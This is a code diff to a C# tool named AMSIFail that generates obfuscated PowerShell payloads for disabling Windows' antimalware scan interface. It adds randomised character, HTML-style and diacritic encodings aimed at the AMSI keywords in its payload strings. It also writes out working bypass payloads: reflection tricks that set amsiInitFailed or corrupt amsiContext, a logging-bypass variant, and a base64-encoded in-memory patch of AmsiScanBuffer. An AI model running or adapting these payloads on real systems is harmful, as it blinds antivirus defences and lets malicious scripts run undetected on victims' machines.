@@ -92,18 +92,18 @@ namespace AMSIFail
 
         }
 
-        public static string ObfuscateChar(char charInput)
+        public static string ObfuscateChar(char charInput, string startChar = "+")
         {
 
             //Select a random encoding method for a single char
             switch (RandomNumber(1, 3))
             {
                 case 1:
-                    return "+[" + RandomCase("CHAR") + "]" + ByteEncode(charInput);
+                    return startChar + "[" + RandomCase("CHAR") + "]" + ByteEncode(charInput);
                 case 2:
-                    return "+[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
+                    return startChar + "[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
                 default:
-                    return "+[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
+                    return startChar + "[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
             }
 
         }
@@ -127,10 +127,10 @@ namespace AMSIFail
             }
         }
 
-        public static string ObfuscateString(string data)
+        public static string ObfuscateString(string data, int maxCase = 3)
         {
             string obfuscatedString = "";
-            switch (RandomNumber(1, 3))
+            switch (RandomNumber(1, maxCase))
             {
                 case 1:
                     foreach (char _char in data)
@@ -139,11 +139,20 @@ namespace AMSIFail
                     }
                     return obfuscatedString;
                 case 2:
-                    //Obfuscate the whole string as HTML
-                    return "+[" + RandomCase("System.Net.WebUtility") + "]::" + RandomCase("HtmlDecode") + "('" + HTMLEncode(data) + "')";
-                case 3:
-                    //This part is not rdy yet :/
-                    return $"+'{DiacriticEncode(data)}'." + @"Normalize('FormD') -replace '\p{Mn}'";
+                    string obfuscatedFormD = "";
+                    string obfuscatedPattern = "";
+
+                    foreach (char _char in "FormD")
+                    {
+                        obfuscatedFormD += ObfuscateChar(_char);
+                    }
+
+                    foreach (char _char in @"\p{Mn}")
+                    {
+                        obfuscatedPattern += ObfuscateChar(_char);
+                    }
+
+                    return $"+'{DiacriticEncode(data)}'." + RandomCase("Normalize") + "(" + obfuscatedFormD.Remove(0, 1) + ") -replace " + obfuscatedPattern.Remove(0, 1);
                 default:
                     return "";
             }
@@ -186,18 +195,31 @@ namespace AMSIFail
 
 
             //Will add more key words here
-            var mustEncode = new string[] { "Amsi", "amsi" };
+            var mustEncodeDict = new Dictionary<string, (bool doubleQ, int maxEnc)>();
 
-            foreach (var word in mustEncode)
+            //Find a way for the keywords to determene if their within single or double Q's
+            //Re-add htmlencode
+            //
+
+            mustEncodeDict.Add("amsiContext", (true, 3));
+            mustEncodeDict.Add("amsiSession", (true, 3));
+            mustEncodeDict.Add("AmsiUtils", (true, 3));
+
+            mustEncodeDict.Add("amsiInitFailed", (false, 3));
+
+            mustEncodeDict.Add("WriteInt32", (true, 3));
+
+
+            foreach (var word in mustEncodeDict)
             {
-                string obfuscatedString = ObfuscateString(word);
+                string obfuscatedString = ObfuscateString(word.Key, word.Value.maxEnc);
 
-                if (doubleQutes)
+                if (word.Value.doubleQ)
                     obfuscatedString = "$(" + obfuscatedString.TrimStart('+') + ")";
                 else
                     obfuscatedString = "'+$(" + obfuscatedString.TrimStart('+') + ")+'";
 
-                examplePayloads = examplePayloads.Replace(word, obfuscatedString);
+                examplePayloads = examplePayloads.Replace(word.Key, obfuscatedString);
             }
 
             return examplePayloads;
@@ -239,13 +261,13 @@ namespace AMSIFail
             var ForceErrer = "#Unknown - Force error \n$" + memVar + "=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(" + ObfuscateInt(9076) + ");[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$" + memVar + ");";
 
             // Using Matt Graebers Reflection method
-            var MattGRefl = "#Matt Graebers Reflection method \n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
+            var MattGRefl = "#Matt Graebers Reflection method \n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);";
 
             //Using Matt Graebers Reflection method with WMF5 autologging bypass
-            var MattGReflLog = "#Matt Graebers Reflection method with WMF5 autologging bypass \n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetField')).Invoke('amsiInitFailed',(('NonPublic,Static') -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
+            var MattGReflLog = "#Matt Graebers Reflection method with WMF5 autologging bypass \n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\")),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
 
             //Using Matt Graebers second Reflection method
-            var MattGref02 = "#Matt Graebers second Reflection method \n[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
+            var MattGref02 = "#Matt Graebers second Reflection method \n[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
 
             //Using rasta-mouses AmsiScanBufferBypass from https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1
             var RastaBuf = Encoding.UTF8.GetString(Convert.FromBase64String("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik="));
